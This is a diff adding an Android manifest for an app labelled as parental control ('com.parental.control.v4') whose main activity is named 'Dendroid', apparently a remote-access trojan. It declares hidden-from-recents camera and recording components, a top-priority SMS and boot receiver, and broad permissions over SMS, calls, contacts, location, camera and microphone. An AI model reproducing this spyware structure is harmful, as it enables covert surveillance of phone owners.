@@ -1,0 +1,86 @@
+<manifest versionName="1.0" versionCode="1" package="com.parental.control.v4">
+<uses-sdk targetSdkVersion="14" minSdkVersion="8">
+</uses-sdk>
+<supports-screens largeScreens="true" xlargeScreens="true" resizeable="true">
+</supports-screens>
+<application theme="resource_id:0x7f050001" icon="resource_id:0x7f020000" label="resource_id:0x7f040000">
+<activity name="com.connect.Dendroid" excludeFromRecents="true">
+<intent-filter>
+<action name="android.intent.action.MAIN">
+</action>
+<category name="android.intent.category.LAUNCHER">
+</category>
+</intent-filter>
+</activity>
+<activity name="com.connect.Dialog" excludeFromRecents="true">
+</activity>
+<activity name="com.connect.CaptureCameraImage" excludeFromRecents="true">
+</activity>
+<activity name="com.connect.CameraView" excludeFromRecents="true">
+</activity>
+<activity name="com.connect.VideoView" excludeFromRecents="true">
+</activity>
+<service name="com.connect.MyService">
+</service>
+<service name="com.connect.RecordService">
+</service>
+<receiver name="com.connect.ServiceReceiver" enabled="true" permission="android.permission.RECEIVE_BOOT_COMPLETED" exported="true">
+<intent-filter priority="1000">
+<action name="android.provider.Telephony.SMS_RECEIVED">
+</action>
+<action name="android.intent.action.BOOT_COMPLETED">
+</action>
+<action name="android.intent.action.PHONE_STATE">
+</action>
+<action name="android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE">
+</action>
+</intent-filter>
+</receiver>
+</application>
+<uses-permission name="android.permission.INTERNET">
+</uses-permission>
+<uses-permission name="android.permission.READ_SMS" required="false">
+</uses-permission>
+<uses-permission name="android.permission.WRITE_SMS" required="false">
+</uses-permission>
+<uses-permission name="android.permission.GET_ACCOUNTS" required="false">
+</uses-permission>
+<uses-permission name="com.android.browser.permission.READ_HISTORY_BOOKMARKS" required="false">
+</uses-permission>
+<uses-permission name="android.permission.ACCESS_NETWORK_STATE">
+</uses-permission>
+<uses-permission name="android.permission.READ_CONTACTS" required="false">
+</uses-permission>
+<uses-permission name="android.permission.ACCESS_FINE_LOCATION" required="false">
+</uses-permission>
+<uses-permission name="android.permission.GET_TASKS" required="false">
+</uses-permission>
+<uses-permission name="android.permission.WAKE_LOCK" required="false">
+</uses-permission>
+<uses-permission name="android.permission.CALL_PHONE" required="false">
+</uses-permission>
+<uses-permission name="android.permission.SEND_SMS" required="false">
+</uses-permission>
+<uses-permission name="android.permission.WRITE_SETTINGS" required="false">
+</uses-permission>
+<uses-permission name="android.permission.READ_PHONE_STATE" required="false">
+</uses-permission>
+<uses-permission name="android.permission.WRITE_EXTERNAL_STORAGE">
+</uses-permission>
+<uses-permission name="android.permission.CAMERA" required="false">
+</uses-permission>
+<uses-permission name="android.permission.RECORD_AUDIO" required="false">
+</uses-permission>
+<uses-permission name="android.permission.PROCESS_OUTGOING_CALLS" required="false">
+</uses-permission>
+<uses-permission name="android.permission.RECEIVE_SMS" required="false">
+</uses-permission>
+<uses-feature name="android.hardware.camera" required="false">
+</uses-feature>
+<uses-feature name="android.hardware.camera.front" required="false">
+</uses-feature>
+<uses-feature name="android.hardware.camera.autofocus" required="false">
+</uses-feature>
+<uses-feature name="android.hardware.microphone" required="false">
+</uses-feature>
+</manifest>
